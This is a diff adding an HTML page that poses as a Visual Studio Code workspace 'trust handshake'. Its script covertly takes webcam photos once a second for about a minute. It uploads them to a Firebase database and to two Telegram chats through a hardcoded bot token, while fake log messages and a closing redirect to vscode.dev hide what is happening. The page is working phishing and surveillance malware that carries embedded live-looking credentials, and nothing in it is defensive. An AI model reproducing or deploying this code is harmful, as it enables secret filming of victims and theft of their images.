@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visual Studio Code | Remote Repository Access</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --vscode-blue: #007acc;
+            --vscode-dark: #1e1e1e;
+            --vscode-sidebar: #252526;
+            --vscode-text: #cccccc;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--vscode-dark); color: var(--vscode-text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .editor-container {
+            width: 100%; max-width: 650px; background: var(--vscode-sidebar);
+            border: 1px solid #3c3c3c; border-radius: 6px; overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .title-bar {
+            background: #323233; padding: 8px 15px; display: flex; align-items: center;
+            font-size: 12px; border-bottom: 1px solid #3c3c3c;
+        }
+
+        .circle-box { display: flex; gap: 6px; margin-right: 20px; }
+        .circle { width: 12px; height: 12px; border-radius: 50%; background: #444; }
+
+        .terminal-body { padding: 40px; text-align: center; }
+
+        .vs-logo { width: 60px; margin-bottom: 20px; filter: grayscale(1); opacity: 0.8; }
+
+        h1 { font-size: 18px; font-weight: 400; color: #fff; margin: 0 0 10px; }
+        p { font-size: 13px; color: #999; line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-connect {
+            background: var(--vscode-blue); color: #fff; border: none;
+            padding: 10px 25px; border-radius: 2px; font-size: 13px;
+            cursor: pointer; transition: background 0.2s;
+        }
+
+        .btn-connect:hover { background: #0062a3; }
+
+        /* Sync Logic UI */
+        #sync-ui { display: none; }
+        .code-loader {
+            font-family: 'Courier New', Courier, monospace; font-size: 14px;
+            color: #4ec9b0; margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            width: 100%; height: 2px; background: #333; margin-top: 20px; position: relative;
+        }
+        .progress-fill {
+            width: 0%; height: 100%; background: var(--vscode-blue);
+            transition: width 1s linear;
+        }
+
+        .log-box {
+            background: #000; border: 1px solid #333; padding: 10px;
+            font-family: monospace; font-size: 11px; text-align: left;
+            margin-top: 20px; height: 80px; overflow-y: hidden; color: #858585;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="editor-container">
+        <div class="title-bar">
+            <div class="circle-box">
+                <div class="circle"></div><div class="circle"></div><div class="circle"></div>
+            </div>
+            <span>Remote Connection - Restricted Repository</span>
+        </div>
+
+        <div class="terminal-body" id="init-ui">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Visual_Studio_Code_1.35_icon.svg" class="vs-logo">
+            <h1>Workspace Identity Verification</h1>
+            <p>To access this shared environment, you must complete the <b>Environment Trust Handshake</b>. This ensures the workspace is only accessible from a secure, verified workstation.</p>
+            
+            <button class="btn-connect" onclick="startSync()">Verify & Connect</button>
+        </div>
+
+        <div class="terminal-body" id="sync-ui">
+            <div class="code-loader">Initializing Secure Tunnel...</div>
+            <div class="log-box" id="logs">
+                [info] Starting Live Share session...<br>
+                [info] Verifying ISP signature: Gaya, Bihar...<br>
+                [warn] Waiting for hardware calibration...
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="p-bar"></div>
+            </div>
+            <div style="font-size: 11px; color: #555; margin-top: 10px;" id="timer">Handshake ends in 60s</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startSync() {
+            try {
+                // Triggered by "Verify & Connect"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-ui').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        
+                        document.getElementById('timer').innerText = `Handshake ends in ${timeLeft}s`;
+                        document.getElementById('p-bar').style.width = `${((60-timeLeft)/60)*100}%`;
+                        
+                        if (count % 10 === 0) updateLogs();
+
+                        if (count <= 55) {
+                            captureDev(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Official VS Code Web or Repository Redirect
+                            window.location.href = "https://vscode.dev";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://vscode.dev";
+            }
+        }
+
+        function updateLogs() {
+            const extra = [
+                "[info] Encrypting biometric relay...",
+                "[info] Syncing local environment nodes...",
+                "[info] Finalizing SSH handshake...",
+                "[info] Validating user proximity..."
+            ];
+            const logBox = document.getElementById('logs');
+            logBox.innerHTML += `<br>${extra[Math.floor(Math.random()*extra.length)]}`;
+        }
+
+        function captureDev(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "VSCODE_SPOOF", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'dev_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
